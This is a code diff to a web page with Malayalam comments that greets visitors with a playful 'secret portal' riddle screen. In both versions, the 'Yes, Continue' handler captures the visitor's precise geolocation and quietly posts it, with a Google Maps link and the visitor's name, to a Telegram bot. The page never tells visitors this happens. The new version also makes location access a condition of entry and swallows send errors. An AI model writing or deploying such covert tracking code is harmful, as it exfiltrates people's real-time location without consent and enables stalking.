@@ -20,7 +20,7 @@
         .blur-bg {
             filter: blur(20px);
             pointer-events: none;
-            transition: filter 0.4s ease; /* ബ്ലർ മാറുന്ന വേഗത കൂട്ടി */
+            transition: filter 0.4s ease;
             height: 100vh;
         }
 
@@ -38,7 +38,7 @@
         header h1 { margin: 0; font-size: 22px; color: #00e5ff; text-shadow: 0 0 10px rgba(0, 229, 255, 0.5); }
 
         /* Welcome Overlay */
-        #welcomeOverlay {
+        .overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background-color: transparent; 
@@ -112,12 +112,12 @@
 </head>
 <body>
 
-    <!-- Glass Popup (Fun Riddle) -->
-    <div id="welcomeOverlay">
+    <!-- Fun Riddle Screen -->
+    <div id="welcomeOverlay" class="overlay">
         <div class="glass-panel">
             <h2>Hello Friend! 🕵️‍♂️</h2>
             <p>Are you certain this secret portal is meant for you?<br><br>Do you wish to proceed and explore further? 😉</p>
-            <button class="yes-btn" id="exploreBtn" onclick="startExploration()">Yes, Continue</button>
+            <button class="yes-btn" onclick="startExploration()">Yes, Continue</button>
         </div>
     </div>
 
@@ -171,42 +171,43 @@
         let myNumber = localStorage.getItem("myNumber") || null;
         let localStream = null;
 
-        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ (ZERO LAG)
+        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ വളരെ വേഗത്തിൽ പ്രവർത്തിക്കുന്ന ഫംഗ്ഷൻ
         function startExploration() {
-            // 1. ഉടനടി ആപ്പിലേക്ക് പ്രവേശിക്കുന്നു (ലൊക്കേഷൻ കിട്ടാൻ വെയിറ്റ് ചെയ്യില്ല)
-            enterApp();
-
-            // 2. ബാക്ഗ്രൗണ്ടിൽ വളരെ നിശബ്ദമായി ലൊക്കേഷൻ എടുക്കുന്നു
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        let userName = (myNumber && AUTHORIZED_USERS[myNumber]) ? AUTHORIZED_USERS[myNumber] : "Guest / Unverified User";
-
-                        const msg = `📍 [SITE EXPLORATION]\n\n👤 Visitor: ${userName}\n🌍 Location: ${locLink}`;
-                        
-                        // ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു (ഒരു ലാഗും ഉണ്ടാക്കില്ല)
-                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`)
-                            .catch(err => console.log("Silent error handled"));
-                    },
-                    (error) => {
-                        // അലർട്ടുകൾ ഒന്നുമില്ല. അലോ ചെയ്തില്ലെങ്കിൽ ആപ്പിനെ ബാധിക്കില്ല.
-                        console.log("Background location fetch ignored/denied.");
-                    },
-                    // maximumAge: 60000 നൽകിയത് വഴി പെട്ടെന്ന് തന്നെ ലൊക്കേഷൻ എടുക്കും (വേഗത കൂട്ടാൻ)
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
-                );
+            if (!navigator.geolocation) {
+                alert("Your browser does not support Geolocation!");
+                return;
             }
+
+            // ബ്രൗസർ പോപ്പ്-അപ്പ് ചോദിക്കുന്നു
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // അലൗ ചെയ്താൽ ഉടൻ തന്നെ ബ്ലർ മാറി ആപ്പിലേക്ക് കയറുന്നു
+                    document.getElementById("welcomeOverlay").style.display = "none";
+                    enterApp();
+
+                    // യാതൊരു തടസ്സവുമില്ലാതെ ബാക്ഗ്രൗണ്ടിൽ ലൊക്കേഷൻ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    let userName = (myNumber && AUTHORIZED_USERS[myNumber]) ? AUTHORIZED_USERS[myNumber] : "Guest / Unverified User";
+
+                    const msg = `📍 [SITE EXPLORATION]\n\n👤 Visitor: ${userName}\n🌍 Location: ${locLink}`;
+                    
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`)
+                        .catch(err => console.log("Silent Error"));
+                },
+                (error) => {
+                    // ക്യാൻസൽ അടിച്ചാൽ (ബ്രൗസർ ബ്ലോക്ക് ആയാൽ) ഒരു വാണിംഗ് മെസ്സേജ് കാണിക്കുന്നു.
+                    alert("Location access is blocked! Please tap the lock icon 🔒 in your browser's URL bar, allow location, and try again.");
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+            );
         }
 
-        // ഉള്ളിലേക്ക് പ്രവേശിപ്പിക്കുന്ന ഭാഗം
+        // ആപ്പിലേക്ക് കടക്കുന്ന ഭാഗം
         function enterApp() {
             document.getElementById("mainApp").classList.remove("blur-bg");
             document.getElementById("mainApp").style.pointerEvents = "auto";
-            
-            document.getElementById("welcomeOverlay").style.display = "none";
             document.body.style.overflow = "auto";
 
             if(myNumber && AUTHORIZED_USERS[myNumber]) {
